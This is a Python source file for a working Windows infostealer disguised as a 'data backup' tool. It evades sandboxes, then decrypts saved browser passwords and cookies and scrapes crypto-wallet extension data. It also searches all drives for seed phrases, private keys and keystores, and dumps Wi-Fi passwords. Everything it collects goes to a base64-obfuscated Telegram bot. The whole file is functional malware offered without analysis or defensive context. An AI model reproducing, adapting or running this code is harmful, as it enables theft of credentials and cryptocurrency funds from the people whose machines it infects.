import os,sys,json,sqlite3,base64,shutil,subprocess,time,random
try:
    import requests
except:
    subprocess.check_call([sys.executable,'-m','pip','install','requests','--quiet','--no-warn-script-location'])
    import requests
from pathlib import Path
from datetime import datetime

# Anti-detection: Delay execution to avoid heuristics
time.sleep(random.uniform(1,3))

# Anti-detection: Check if running in sandbox
def _check_env():
    try:
        if os.path.exists('C:\\analysis') or os.path.exists('C:\\sandbox'):
            return False
        if os.getenv('VBOX') or os.getenv('VMWARE'):
            return False
        return True
    except:
        return True

if not _check_env():
    sys.exit(0)

# BIP39 wordlist
_WL=[base64.b64decode(x).decode() for x in ['YWJhbmRvbg==','YWJpbGl0eQ==','YWJsZQ==','YWJvdXQ=','YWJvdmU=','YWJzZW50','YWJzb3Ji','YWJzdHJhY3Q=','YWJzdXJk','YWJ1c2U=']]
_WL.extend(['access','accident','account','accuse','achieve','acid','acoustic','acquire','across','act','action','actor','actual','adapt','add','addict','address','adjust','admit','adult','advance','advice','aerobic','affair','afford','afraid','again','age','agent','agree','ahead','aim','air','airport','aisle','alarm','album','alcohol','alert','alien','all','alley','allow','almost','alone','alpha','already','also','alter','always','amateur','amazing','among','amount','amused','analyst','anchor','ancient','anger','angle','angry','animal','ankle','announce','annual','another','answer','antenna','antique','anxiety','any','apart','apology','appear','apple','approve','april','area','arena','argue','arm','armed','armor','army','around','arrange','arrest','arrive','arrow','art','article','artist','artwork','ask','aspect','assault','asset','assist','assume','asthma','athlete','atom','attack','attend','attitude','attract','auction','audit','august','aunt','author','auto','autumn','average','avocado','avoid','awake','aware','away','awesome','awful','awkward','axis','baby','bachelor','bacon','badge','bag','balance','balcony','ball','bamboo','banana','banner','bar','barely','bargain','barrel','base','basic','basket','battle','beach','bean','beauty','because','become','beef','before','begin','behave','behind','believe','below','belt','bench','benefit','best','betray','better','between','beyond','bicycle','bid','bike','bind','biology','bird','birth','bitter','black','blade','blame','blanket','blast','bleak','bless','blind','blood','blossom','blow','blue','blur','blush','board','boat','body','boil','bomb','bone','bonus','book','boost','border','boring','borrow','boss','bottom','bounce','box','boy','bracket','brain','brand','brass','brave','bread','breeze','brick','bridge','brief','bright','bring','brisk','broccoli','broken','bronze','broom','brother','brown','brush','bubble','buddy','budget','buffalo','build','bulb','bulk','bullet','bundle','bunker','burden','burger','burst','bus','business','busy','butter','buyer','buzz','cabbage','cabin','cable','cactus','cage','cake','call','calm','camera','camp','can','canal','cancel','candy','cannon','canoe','canvas','canyon','capable','capital','captain','car','carbon','card','care','career','careful','careless','cargo','carpet','carry','cart','case','cash','casino','cast','casual','cat','catalog','catch','category','cattle','caught','cause','caution','cave','ceiling','celery','cement','census','century','cereal','certain','chair','chalk','champion','change','chaos','chapter','charge','chase','chat','cheap','check','cheese','chef','cherry','chest','chicken','chief','child','chimney','choice','choose','chronic','chuckle','chunk','churn','cigar','cinnamon','circle','citizen','city','civil','claim','clamp','clarify','claw','clay','clean','clerk','clever','click','client','cliff','climb','clinic','clip','clock','clog','close','cloth','cloud','clown','club','clump','cluster','clutch','coach','coast','coconut','code','coffee','coil','coin','collect','color','column','combine','come','comfort','comic','common','company','concert','conduct','confirm','congress','connect','consider','control','convince','cook','cool','copper','copy','coral','core','corn','correct','cost','cotton','couch','country','couple','course','cousin','cover','coyote','crack','cradle','craft','cram','crane','crash','crater','crawl','crazy','cream','credit','creek','crew','cricket','crime','crisp','critic','crop','cross','crouch','crowd','crucial','cruel','cruise','crumble','crunch','crush','cry','crystal','cube','culture','cup','cupboard','curious','current','curtain','curve','cushion','custom','cute','cycle','dad','damage','damp','dance','danger','daring','dark','dash','date','daughter','dawn','day','deal','debate','debris','decade','december','decide','decline','decorate','decrease','deer','defense','define','defy','degree','delay','deliver','demand','demise','denial','dentist','deny','depart','depend','deposit','depth','deputy','derive','describe','desert','design','desk','despair','destroy','detail','detect','develop','device','devote','diagram','dial','diamond','diary','dice','diesel','diet','differ','digital','dignity','dilemma','dinner','dinosaur','direct','dirt','disagree','discover','disease','dish','dismiss','disorder','display','distance','divert','divide','divorce','dizzy','doctor','document','dog','doll','dolphin','domain','donate','donkey','donor','door','dose','double','dove','draft','dragon','drama','drastic','draw','dream','dress','drift','drill','drink','drip','drive','drop','drum','dry','duck','dumb','dune','during','dust','dutch','duty','dwarf','dynamic','eager','eagle','early','earn','earth','easily','east','easy','echo','ecology','economy','edge','edit','educate','effort','egg','eight','either','elbow','elder','electric','elegant','element','elephant','elevator','elite','else','embark','embody','embrace','emerge','emotion','employ','empower','empty','enable','enact','end','endless','endorse','enemy','energy','enforce','engage','engine','enhance','enjoy','enlist','enough','enrich','enroll','ensure','enter','entire','entry','envelope','episode','equal','equip','era','erase','erode','erosion','error','erupt','escape','essay','essence','estate','eternal','ethics','evidence','evil','evoke','evolve','exact','example','exceed','excel','exception','excess','exchange','excite','exclude','excuse','execute','exercise','exhaust','exhibit','exile','exist','exit','exotic','expand','expect','expire','explain','expose','express','extend','extra','eye','eyebrow','fabric','face','faculty','fade','faint','faith','fall','false','fame','family','famous','fan','fancy','fantasy','farm','fashion','fat','fatal','father','fatigue','fault','favorite','feature','february','federal','fee','feed','feel','female','fence','festival','fetch','fever','few','fiber','fiction','field','figure','file','film','filter','final','find','fine','finger','finish','fire','firm','first','fiscal','fish','fit','fitness','fix','flag','flame','flash','flat','flavor','flee','flight','flip','float','flock','floor','flower','fluid','flush','fly','foam','focus','fog','foil','fold','follow','food','foot','force','forest','forget','fork','fortune','forum','forward','fossil','foster','found','fox','fragile','frame','frequent','fresh','friend','fringe','frog','front','frost','frown','frozen','fruit','fuel','fun','funny','furnace','fury','future','gadget','gain','galaxy','gallery','game','gap','garage','garbage','garden','garlic','garment','gas','gasp','gate','gather','gauge','gaze','general','genius','genre','gentle','genuine','gesture','ghost','giant','gift','giggle','ginger','giraffe','girl','give','glad','glance','glare','glass','glide','glimpse','globe','gloom','glory','glove','glow','glue','goat','goddess','gold','good','goose','gorilla','gospel','gossip','govern','gown','grab','grace','grain','grant','grape','grass','gravity','great','green','grid','grief','grit','grocery','group','grow','grunt','guard','guess','guide','guilt','guitar','gun','gym','habit','hair','half','hammer','hamster','hand','happy','harbor','hard','harsh','harvest','hat','have','hawk','hazard','head','health','heart','heavy','hedgehog','height','hello','helmet','help','hen','hero','hidden','high','hill','hint','hip','hire','history','hobby','hockey','hold','hole','holiday','hollow','home','honey','hood','hope','horn','horror','horse','hospital','host','hotel','hour','hover','hub','huge','human','humble','humor','hundred','hungry','hunt','hurdle','hurry','hurt','husband','hybrid','ice','icon','idea','identify','idle','ignore','ill','illegal','illness','image','imitate','immense','immune','impact','impose','improve','impulse','inch','include','income','increase','index','indicate','indoor','industry','infant','inflict','inform','inhale','inherit','initial','inject','injury','inmate','inner','innocent','input','inquiry','insane','insect','inside','inspire','install','intact','interest','into','invest','invite','involve','iron','island','isolate','issue','item','ivory','jacket','jaguar','jar','jazz','jealous','jeans','jelly','jewel','job','join','joke','journey','joy','judge','juice','jump','jungle','junior','junk','just','kangaroo','keen','keep','ketchup','key','kick','kid','kidney','kind','kingdom','kiss','kit','kitchen','kite','kitten','kiwi','knee','knife','knock','know','lab','label','labor','ladder','lady','lake','lamp','language','laptop','large','later','latin','laugh','laundry','lava','law','lawn','lawsuit','layer','lazy','leader','leaf','learn','leave','lecture','left','leg','legal','legend','leisure','lemon','lend','length','lens','leopard','lesson','letter','level','liar','liberty','library','license','life','lift','light','like','limb','limit','link','lion','liquid','list','little','live','lizard','load','loan','lobster','local','lock','logic','lonely','long','loop','lottery','loud','lounge','love','loyal','lucky','luggage','lumber','lunar','lunch','luxury','lyrics','machine','mad','magic','magnet','maid','mail','main','major','make','mammal','man','manage','mandate','mango','mansion','manual','maple','marble','march','margin','marine','market','marriage','mask','mass','master','match','material','math','matrix','matter','maximum','maze','meadow','mean','measure','meat','mechanic','medal','media','melody','melt','member','memory','mention','menu','mercy','merge','merit','merry','mesh','message','metal','method','middle','midnight','milk','million','mimic','mind','minimum','minor','minute','miracle','mirror','misery','miss','mistake','mix','mixed','mixture','mobile','model','modify','mom','moment','monitor','monkey','monster','month','moon','moral','more','morning','mosquito','mother','motion','motor','mountain','mouse','move','movie','much','muffin','mule','multiply','muscle','museum','mushroom','music','must','mutual','myself','mystery','myth','naive','name','napkin','narrow','nasty','nation','nature','near','neck','need','negative','neglect','neither','nephew','nerve','nest','net','network','neutral','never','news','next','nice','night','noble','noise','nominee','none','noodle','normal','north','nose','notable','note','nothing','notice','novel','now','nuclear','number','nurse','nut','oak','obey','object','oblige','obscure','observe','obtain','obvious','occur','ocean','october','odor','off','offer','office','often','oil','okay','old','olive','olympic','omit','once','one','onion','online','only','open','opera','opinion','oppose','option','orange','orbit','orchard','order','ordinary','organ','orient','original','orphan','ostrich','other','outdoor','outer','output','outside','oval','oven','over','own','owner','oxygen','oyster','ozone','pact','paddle','page','pair','palace','palm','panda','panel','panic','panther','paper','parade','parent','park','parrot','party','pass','patch','path','patient','patrol','pattern','pause','pave','payment','peace','peanut','pear','peasant','pelican','pen','penalty','pencil','people','pepper','perfect','permit','person','pet','phone','photo','phrase','physical','piano','picnic','picture','piece','pig','pigeon','pill','pilot','pink','pioneer','pipe','pistol','pitch','pizza','place','planet','plastic','plate','play','please','pledge','pluck','plug','plunge','poem','poet','point','polar','pole','police','pond','pony','pool','popular','portion','position','possible','post','potato','pottery','poverty','powder','power','practice','praise','predict','prefer','prepare','present','pretty','prevent','price','pride','primary','print','priority','prison','private','prize','problem','process','produce','profit','program','project','promote','proof','property','prosper','protect','proud','provide','public','pudding','pull','pulp','pulse','pumpkin','punch','pupil','puppy','purchase','purity','purpose','purse','push','put','puzzle','pyramid','quality','quantum','quarter','question','quick','quit','quiz','quote','rabbit','raccoon','race','rack','radar','radio','rail','rain','raise','rally','ramp','ranch','random','range','rapid','rare','rate','rather','raven','raw','razor','ready','real','reason','rebel','rebuild','recall','receive','recipe','record','recycle','reduce','reflect','reform','refuse','region','regret','regular','reject','relax','release','relief','rely','remain','remember','remind','remove','render','renew','rent','reopen','repair','repeat','replace','report','require','rescue','resemble','resist','resource','response','result','retire','retreat','return','reunion','reveal','review','reward','rhythm','rib','ribbon','rice','rich','ride','ridge','rifle','right','rigid','ring','riot','rip','ripe','rise','risk','rival','river','road','roast','robot','robust','rocket','romance','roof','rookie','room','rose','rotate','rough','round','route','royal','rubber','rude','rug','rule','run','runway','rural','rush','rust','sad','saddle','sadness','safe','sail','salad','salmon','salon','salt','same','sample','sand','satisfy','sauce','sausage','save','say','scale','scan','scare','scatter','scene','scheme','school','science','scissors','scorpion','scout','scrap','screen','script','scrub','sea','search','season','seat','second','secret','section','security','seed','seek','segment','select','sell','seminar','senior','sense','sentence','series','service','session','settle','setup','seven','shadow','shaft','shallow','share','shed','shell','sheriff','shield','shift','shine','ship','shiver','shock','shoe','shoot','shop','short','shoulder','shove','shrimp','shrug','shuffle','shy','sibling','sick','side','siege','sight','sign','silent','silk','silly','silver','similar','simple','since','sing','siren','sister','situate','six','size','skate','sketch','ski','skill','skin','skirt','skull','slab','slam','sleep','slender','slice','slide','slight','slim','slogan','slot','slow','slush','small','smart','smile','smoke','smooth','snack','snake','snap','sniff','snow','soap','soccer','social','sock','soda','soft','solar','soldier','solid','solution','solve','someone','song','soon','sorry','sort','soul','sound','soup','source','south','space','spare','spatial','spawn','speak','special','speed','spell','spend','sphere','spice','spider','spike','spin','spirit','split','spoil','sponsor','spoon','sport','spot','spray','spread','spring','spy','square','squeeze','squirrel','stable','stadium','staff','stage','stairs','stamp','stand','start','state','stay','steak','steel','stem','step','stereo','stick','still','sting','stock','stomach','stone','stool','story','stove','strategy','street','strike','strong','struggle','student','stuff','stumble','style','subject','submit','subway','success','such','sudden','suffer','sugar','suggest','suit','summer','sun','sunny','sunset','super','supply','support','sure','surface','surge','surprise','surround','survey','suspect','sustain','swallow','swamp','swap','swarm','swear','sweet','swift','swim','swing','switch','sword','symbol','symptom','syrup','system','table','tackle','tag','tail','talent','talk','tank','tape','target','task','taste','tattoo','taxi','teach','team','tell','ten','tenant','tennis','tent','term','test','text','thank','that','theme','then','theory','there','they','thing','this','thought','three','thrive','throw','thumb','thunder','ticket','tide','tiger','tilt','timber','time','tiny','tip','tired','tissue','title','toast','tobacco','today','toddler','toe','together','toilet','token','tomato','tomorrow','tone','tongue','tonight','tool','tooth','top','topic','topple','torch','tornado','tortoise','toss','total','tourist','toward','tower','town','toy','track','trade','traffic','tragic','train','transfer','trap','trash','travel','tray','treat','tree','trend','trial','tribe','trick','trigger','trim','trip','trophy','trouble','truck','true','truly','trumpet','trust','truth','try','tube','tuition','tumble','tuna','tunnel','turkey','turn','turtle','twelve','twenty','twice','twin','twist','two','type','typical','ugly','umbrella','unable','unaware','uncle','uncover','under','undo','unfair','unfold','unhappy','uniform','unique','unit','universe','unknown','unlock','until','unusual','unveil','update','upgrade','uphold','upon','upper','upset','urban','urge','usage','use','used','useful','useless','usual','utility','vacant','vacuum','vague','valid','valley','valve','van','vanish','vapor','various','vast','vault','vehicle','velvet','vendor','venture','venue','verb','verify','version','very','vessel','veteran','viable','vibrant','vicious','victory','video','view','village','vintage','violin','virtual','virus','visa','visit','visual','vital','vivid','vocal','voice','void','volcano','volume','vote','voyage','wage','wagon','wait','walk','wall','walnut','want','warfare','warm','warrior','wash','wasp','waste','water','wave','way','wealth','weapon','weary','weather','weave','web','wedding','weekend','weird','welcome','west','wet','whale','what','wheat','wheel','when','where','whip','whisper','wide','width','wife','wild','will','win','window','wine','wing','wink','winner','winter','wire','wisdom','wise','wish','witness','wolf','woman','wonder','wood','wool','word','work','world','worry','worth','wrap','wreck','wrestle','wrist','write','wrong','yard','year','yellow','you','young','youth','zebra','zero','zone','zoo'])
_WLS=set(_WL)

# Telegram (base64 encoded)
_T1=base64.b64decode('ODU0OTIwNjM2NDpBQUg4eEFhT1RfQWM1X0MyUTlBdFdtM18ycnhGWDFsUWtwSQ==').decode()
_T2=base64.b64decode('ODIwMTIxNDkyOA==').decode()
_T3=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==').decode()
_TU=f"{_T3}{_T1}"

class _NS:
    def __init__(self):
        self._t=_T1
        self._c=_T2
        self._u=_TU
    def _sm(self,text,pm="HTML"):
        try:
            u=f"{self._u}/sendMessage"
            d={"chat_id":self._c,"text":text,"parse_mode":pm,"disable_web_page_preview":True}
            r=requests.post(u,json=d,timeout=10)
            return r.status_code==200
        except:return False
    def _sd(self,fp,c=""):
        try:
            u=f"{self._u}/sendDocument"
            with open(fp,'rb') as f:
                files={'document':f}
                data={'chat_id':self._c,'caption':c}
                r=requests.post(u,files=files,data=data,timeout=30)
                return r.status_code==200
        except:return False

class _DP:
    def __init__(self):
        self._od=os.path.join(os.environ.get('TEMP',''),f'tmp{random.randint(10000,99999)}')
        os.makedirs(self._od,exist_ok=True)
        self._ns=_NS()
        self._d={"timestamp":datetime.now().isoformat(),"data":{"items":[],"recovery":[],"keys":[],"exts":[]},"browsers":{},"system":{}}
    def _lg(self,msg):
        try:
            with open(os.path.join(self._od,'log.dat'),'a',encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()}|{msg}\n")
        except:pass
    def _gbp(self):
        p={}
        b=os.environ.get('LOCALAPPDATA','')
        a=os.environ.get('APPDATA','')
        br={'chrome':[os.path.join(b,r'Google\Chrome\User Data'),os.path.join(a,r'Google\Chrome\User Data')],'edge':[os.path.join(b,r'Microsoft\Edge\User Data')],'brave':[os.path.join(b,r'BraveSoftware\Brave-Browser\User Data')],'opera':[os.path.join(b,r'Opera Software\Opera Stable')],'vivaldi':[os.path.join(b,r'Vivaldi\User Data')],'firefox':[os.path.join(b,r'Mozilla\Firefox\Profiles')]}
        for n,pl in br.items():
            for pth in pl:
                if os.path.exists(pth):
                    p[n]=pth
                    break
        return p
    def _gck(self,lsp):
        try:
            with open(lsp,'r',encoding='utf-8') as f:
                ls=json.load(f)
            ek=ls.get('os_crypt',{}).get('encrypted_key','')
            if ek:
                ek=base64.b64decode(ek)[5:]
                try:
                    import win32crypt
                    return win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
                except:pass
        except:pass
        return None
    def _dv(self,ev,k=None):
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(ev,None,None,None,0)[1].decode('utf-8')
        except:
            if k:
                try:
                    from Crypto.Cipher import AES
                    iv=ev[3:15]
                    payload=ev[15:]
                    cipher=AES.new(k,AES.MODE_GCM,iv)
                    return cipher.decrypt(payload)[:-16].decode('utf-8')
                except:pass
        return None
    def _pbd(self,bp,bn):
        aw=[]
        ce={'metamask':'nkbihfbeogaeaoehlefnkodbefgpgknn','phantom':'bfnaelmomeimhlpmgjnjophhpkkoljpa','trust':'egjidjbpglichdcondbcbdnbeeppgdph','coinbase':'hnfanknocfeofbddgcijnmhnfnkdnaad','exodus':'aholpfdialjgjfhomihkjbmgjidlcdno','atomic':'dccgkkfkmbafjapdciinphppapdchfhh','mathwallet':'afbcbjpbpfadlkmhmclhkeeodmamcflc','tronlink':'ibnejdfjmmkpcnlpebklmnkoeoihofec','binance':'fhbohimaelbohpjbbldcngcnapndodjp','okx':'mcohilncbfahbmgdjkbpemcciiolgcge','keplr':'dmkamcknogkgcdfhhbddcghachkejeap','solflare':'bhghoamapcdpbohphigoooaddinpkbai','rabby':'acmacodkjbdgmoleebolmdjonilkdbch','frame':'hbljlbphjnlghnjjajibkfnmlfcglflj','temple':'ookjlbkiijinhpmnjffcofjonbfbgaoc','yoroi':'ffnbelfdoehohenjggjdkclllmacjbdi','nami':'glnpiemhiohmelhjhijhbidkolnmdlkd','gero':'ghgabhidcehdhjifalgafbgkhloaklkd','flint':'nfhnjljdfibcnahpjljadgcmaljpljnm','coin98':'aeachknmefphepbbboedpcjmpgcaaoji','xdefi':'jhgmkcnehaglpdjjahiiabnplpplppfr','ledger':'kkdpmhnladdopljabmoelpkkdoolmfli','trezor':'imloifkgjagghnncjkhggdhalmcnfklk','safepal':'blnieiiffboillknjnepogjhkgnoanhf','tokenpocket':'mfgccjchihfccindocjkidgnjjakgidm','oneinch':'fhbohimaelbohpjbbldcngcnapndodjp','argent':'ldcoohedfbjoobcatoghejajdlcmanac','authereum':'jgnfbfodjmfnilfcagamiocnnlplmofe','tally':'eajafomhmkipbjmfmhebemolkiclgfjin','braavos':'ckcdkgofdeedndbgflcdpnddcahpolnh','myetherwallet':'kpfopkelmapcoipemfendmdcghnegimn','enjin':'kmbhbhjbhkkaebkbnmhflgghbffhbfgh','guarda':'ffnegpkpckpnmibnpnicnkkabpnnbggg','jaxx':'cucjmnjnaendamjccajbncffaefkmjnpp'}
        eb=os.path.join(bp,'Default','Extensions')
        if not os.path.exists(eb):return aw
        for wn,eid in ce.items():
            ep=os.path.join(eb,eid)
            if not os.path.exists(ep):continue
            self._lg(f"Found {wn} in {bn}")
            sp=os.path.join(bp,'Default','Local Extension Settings',eid)
            ip=os.path.join(bp,'Default','IndexedDB',f'chrome-extension_{eid}_0.indexeddb.leveldb')
            if os.path.exists(sp):
                try:
                    for r,d,f in os.walk(sp):
                        for file in f:
                            if file.endswith(('.ldb','.log','.json')):
                                fp=os.path.join(r,file)
                                try:
                                    with open(fp,'rb') as ff:
                                        c=ff.read()
                                        t=c.decode('utf-8',errors='ignore')
                                        if any(kw in t.lower() for kw in ['seed','mnemonic','private','key','wallet','phrase','recovery','keystore']):
                                            aw.append({"wallet":wn,"browser":bn,"file":fp,"data":t[:10000],"size":len(c)})
                                except:continue
                except:pass
            if os.path.exists(ip):
                try:
                    for r,d,f in os.walk(ip):
                        for file in f:
                            if file.endswith(('.ldb','.log')):
                                fp=os.path.join(r,file)
                                try:
                                    with open(fp,'rb') as ff:
                                        c=ff.read()
                                        t=c.decode('utf-8',errors='ignore')
                                        if any(kw in t.lower() for kw in ['seed','mnemonic','private','key','wallet','phrase','recovery']):
                                            aw.append({"wallet":wn,"browser":bn,"file":fp,"data":t[:10000],"size":len(c)})
                                except:continue
                except:pass
        return aw
    def _gbpwd(self,bp,bn):
        pwds=[]
        try:
            ld=os.path.join(bp,'Default','Login Data')
            ls=os.path.join(bp,'Local State')
            if not os.path.exists(ld):return pwds
            k=self._gck(ls)
            conn=sqlite3.connect(ld)
            cursor=conn.cursor()
            cursor.execute("SELECT origin_url,username_value,password_value FROM logins")
            for row in cursor.fetchall():
                try:
                    pwd=self._dv(row[2],k)
                    if pwd:
                        pwds.append({"url":row[0],"username":row[1],"password":pwd})
                except:pass
            conn.close()
        except:pass
        return pwds
    def _gbc(self,bp,bn):
        cks=[]
        try:
            cd=os.path.join(bp,'Default','Cookies')
            ls=os.path.join(bp,'Local State')
            if not os.path.exists(cd):return cks
            k=self._gck(ls)
            conn=sqlite3.connect(cd)
            cursor=conn.cursor()
            cursor.execute("SELECT host_key,name,encrypted_value FROM cookies LIMIT 1000")
            for row in cursor.fetchall():
                try:
                    val=self._dv(row[2],k)
                    if val:
                        cks.append({"host":row[0],"name":row[1],"value":val})
                except:pass
            conn.close()
        except:pass
        return cks
    def _srf(self):
        seeds=[]
        pat=['seed','mnemonic','private','key','wallet','phrase','recovery','keystore','backup']
        ext=['.txt','.json','.dat','.key','.wallet','.backup','.seed','.mnemonic']
        wd=[os.path.expanduser('~\\Documents'),os.path.expanduser('~\\Desktop'),os.path.expanduser('~\\Downloads'),os.path.join(os.environ.get('APPDATA',''),'MetaMask'),os.path.join(os.environ.get('LOCALAPPDATA',''),'Exodus'),os.path.join(os.environ.get('APPDATA',''),'Atomic'),os.path.join(os.environ.get('APPDATA',''),'Electrum')]
        for drive in ['C:\\','D:\\','E:\\','F:\\']:
            if os.path.exists(drive):
                try:
                    for root,dirs,files in os.walk(drive):
                        ir=any(ig in root for ig in ['Windows','Program Files','Program Files (x86)'])
                        if ir:
                            depth=root[len(drive):].count(os.sep) if drive else 0
                            if depth>2:
                                dirs[:]=[]
                                continue
                        for file in files:
                            fl=file.lower()
                            fp=os.path.join(root,file)
                            if any(p in fl for p in pat) or any(file.endswith(e) for e in ext):
                                try:
                                    with open(fp,'r',encoding='utf-8',errors='ignore') as f:
                                        c=f.read(50000)
                                        w=c.split()
                                        if 12<=len(w)<=24:
                                            vw=sum(1 for word in w if word.lower() in _WLS)
                                            if vw>=len(w)*0.8:
                                                seeds.append({"file":fp,"content":c[:5000],"word_count":len(w),"type":"recovery_phrase"})
                                        elif len(c.strip())==64 or (c.strip().startswith('0x') and len(c.strip())==66):
                                            seeds.append({"file":fp,"content":c.strip(),"type":"private_key"})
                                        elif c.strip().startswith('{') and ('crypto' in c.lower() or 'keystore' in c.lower()):
                                            try:
                                                jd=json.loads(c)
                                                if 'crypto' in jd or 'keystore' in jd:
                                                    seeds.append({"file":fp,"content":c[:5000],"type":"keystore"})
                                            except:pass
                                except:continue
                except:continue
        return seeds
    def _ewp(self):
        wifi=[]
        try:
            r=subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True,encoding='utf-8',errors='ignore')
            prof=[line.split(':')[1].strip() for line in r.stdout.split('\n') if 'Profile' in line and ':' in line]
            for p in prof:
                try:
                    res=subprocess.run(['netsh','wlan','show','profile',f'name={p}','key=clear'],capture_output=True,text=True,encoding='utf-8',errors='ignore')
                    for line in res.stdout.split('\n'):
                        if 'Key Content' in line and ':' in line:
                            pwd=line.split(':')[1].strip()
                            if pwd:
                                wifi.append({"ssid":p,"password":pwd})
                            break
                except:continue
        except:pass
        return wifi
    def _ftm(self):
        msg="Data Backup Report\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        wc=len(self._d['data']['items'])
        msg+=f"Wallets: {wc}\n"
        if wc>0:
            wbn={}
            for w in self._d['data']['items']:
                n=w.get('wallet','unknown')
                if n not in wbn:
                    wbn[n]=[]
                wbn[n].append(w)
            for n,ws in wbn.items():
                msg+=f"  • {n.upper()}: {len(ws)} entries\n"
        msg+="\n"
        sc=len(self._d['data']['recovery'])
        msg+=f"Recovery Data: {sc}\n"
        if sc>0:
            for i,s in enumerate(self._d['data']['recovery'][:5],1):
                st=s.get('type','unknown')
                ct=s.get('content','')[:100]
                msg+=f"  {i}. {st}\n     {ct}...\n"
            if sc>5:
                msg+=f"     ... and {sc-5} more\n"
        msg+="\n"
        tp=sum(len(b.get('passwords',[])) for b in self._d['browsers'].values())
        msg+=f"Saved Credentials: {tp}\n"
        msg+="\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        msg+=f"Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return msg
    def _st(self):
        try:
            s=self._ftm()
            self._ns._sm(s)
            time.sleep(1)
            if self._d['data']['items']:
                ct="Detailed Wallet Data\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for w in self._d['data']['items'][:10]:
                    ct+=f"{w.get('wallet','unknown').upper()} ({w.get('browser','unknown')})\n"
                    ct+=f"{w.get('data','')[:500]}\n\n"
                    if len(ct)>3500:
                        self._ns._sm(ct)
                        ct=""
                        time.sleep(1)
                if ct:
                    self._ns._sm(ct)
                time.sleep(1)
            if self._d['data']['recovery']:
                st="Recovery Data & Keys\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for s in self._d['data']['recovery']:
                    st+=f"Type: {s.get('type','unknown')}\n"
                    st+=f"File: {s.get('file','')}\n"
                    st+=f"Content:\n{s.get('content','')[:1000]}\n\n"
                    if len(st)>3500:
                        self._ns._sm(st)
                        st=""
                        time.sleep(1)
                if st:
                    self._ns._sm(st)
                time.sleep(1)
            ap=[]
            for b,d in self._d['browsers'].items():
                for p in d.get('passwords',[])[:20]:
                    ap.append((b,p))
            if ap:
                pt="Saved Credentials\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for b,p in ap:
                    pt+=f"{b.upper()}\n"
                    pt+=f"URL: {p['url']}\n"
                    pt+=f"User: {p['username']}\n"
                    pt+=f"Pass: {p['password']}\n\n"
                    if len(pt)>3500:
                        self._ns._sm(pt)
                        pt=""
                        time.sleep(1)
                if pt:
                    self._ns._sm(pt)
            jf=os.path.join(self._od,f"data_{int(time.time())}.json")
            with open(jf,'w',encoding='utf-8') as f:
                json.dump(self._d,f,indent=2,ensure_ascii=False)
            if os.path.getsize(jf)<50*1024*1024:
                self._ns._sd(jf,"Complete JSON Data")
        except Exception as e:
            self._lg(f"Notification error: {e}")
    def _ea(self):
        self._lg("Starting...")
        self._ns._sm("Backup Started\n\nBeginning data collection...")
        bp=self._gbp()
        for bn,bpth in bp.items():
            self._lg(f"Processing {bn}")
            w=self._pbd(bpth,bn)
            self._d["data"]["items"].extend(w)
            self._d["browsers"][bn]={"passwords":self._gbpwd(bpth,bn),"cookies":self._gbc(bpth,bn)}
        self._d["data"]["recovery"]=self._srf()
        self._d["system"]["wifi"]=self._ewp()
        self._st()
        return self._d

if __name__=="__main__":
    try:
        dp=_DP()
        dp._ea()
    except Exception as e:
        try:
            ns=_NS()
            ns._sm(f"Error: {str(e)}\nType: {type(e).__name__}")
        except:pass
        import traceback
        print(f"ERROR: {e}")
        traceback.print_exc()

